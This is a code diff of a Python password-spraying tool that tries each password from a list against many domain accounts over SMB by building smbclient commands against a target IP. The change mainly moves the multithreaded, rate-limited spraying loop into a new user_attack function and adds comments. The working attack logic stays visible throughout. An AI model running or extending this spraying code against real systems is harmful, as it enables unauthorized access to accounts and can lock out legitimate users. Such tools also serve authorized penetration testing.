@@ -43,7 +43,7 @@ def write_output(user, password, output):
 # new print statement for being able to print in varying colors
 def printColor(color_input, color):
     if color == 'red':
-        print("\033[91m {}\033[00m" .format(color_input))
+        print("\033[91m {}\033[00m".format(color_input))
     elif color == 'green':
         print("\033[92m {}\033[00m".format(color_input))
     elif color == 'yellow':
@@ -52,6 +52,25 @@ def printColor(color_input, color):
         print(color_input)
 
 
+# this function allows the user spraying to be multi-threaded
+def user_attack(user_list, domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean,
+                temp_users, threading, rate_limit):
+    # create a pool and limit processes 
+    if rate_limit > 0:
+        time.sleep(rate_limit)
+        pool = multiprocessing.Pool(processes=1)
+    else:
+        pool = multiprocessing.Pool(processes=threading)
+
+    # run the for loop attack using the threaded rules
+    for user in user_list:
+        pool.apply_async(attack, args=(
+            domain, target_ip, output, bypass, verbose, very_verbose, user, password, user_list_clean, temp_users,))
+    pool.close()
+    pool.join()
+
+
+# this function is the actual password attack
 def attack(domain, target_ip, output, bypass, verbose, very_verbose, user, password, user_list_clean, temp_users):
     # build the command line argument for smbclient
     arguments = 'smbclient -U "%s\%s%%%s" -L %s' % (domain, user, password, target_ip)
@@ -126,7 +145,9 @@ def attack(domain, target_ip, output, bypass, verbose, very_verbose, user, passw
                 write_output(user, password, output)
 
 
-def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_limit, delay, verbose, very_verbose, threading):
+# this function takes all the command line arguments and starts the spraying attack
+def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_limit, delay, verbose, very_verbose,
+            threading):
     # loop through each set of passwords, spraying each user
     print("Running")
     # remove the new line character from the users
@@ -140,9 +161,6 @@ def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_li
         password = password.replace("\n", "")
         password_list_clean.append(password)
 
-    # create a pool and limit processes
-    pool = multiprocessing.Pool(processes=threading)
-
     # create a copy of the user list to remove users if the correct password is found, or the account gets locked
     temp_users = user_list_clean[:]
     for password in password_list_clean:
@@ -150,16 +168,8 @@ def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_li
         printColor(("Spraying using %s" % password), "yellow")
         # update the user_list based on found passwords or locked accounts
         user_list = temp_users[:]
-        for user in user_list:
-            # use the rate limiter between accounts attacked if set
-            if rate_limit > 0:
-                time.sleep(rate_limit)
-                pool = multiprocessing.Pool(processes=1)
-                pool.apply_async(attack, args=(domain, target_ip, output, bypass, verbose, very_verbose, user, password, user_list_clean, temp_users, ))
-            else:
-                pool.apply_async(attack, args=(domain, target_ip, output, bypass, verbose, very_verbose, user, password, user_list_clean, temp_users, ))
-        pool.close()
-        pool.join()
+        user_attack(user_list, domain, target_ip, output, bypass, verbose, very_verbose, password, user_list_clean,
+                    temp_users, threading, rate_limit)
     print("Complete")
 
 
